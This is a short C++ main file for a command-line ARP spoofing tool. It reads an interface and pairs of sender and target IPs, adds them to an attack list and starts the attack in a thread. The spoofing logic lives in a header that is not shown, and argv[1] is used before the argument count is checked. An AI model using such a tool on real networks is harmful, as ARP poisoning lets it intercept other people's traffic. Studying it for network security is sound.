#include "arp_spoof.h"

int main(int argc, char * argv[])
{
   
    ARPSpoof arpSpoof((uint8_t *)argv[1]);

    if(argc%2 ==1 || argc <4)
    {
        printf("usage : arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
        return 1;

    }

    for(int i =1; i < argc/2; i++)
    {
        
        arpSpoof.AddAttackList((uint32_t)inet_addr(argv[i*2]), (uint32_t)inet_addr(argv[i*2 + 1]));

    }

    thread attackStart (&ARPSpoof::AttackStart, &arpSpoof);
    
    attackStart.join();

}
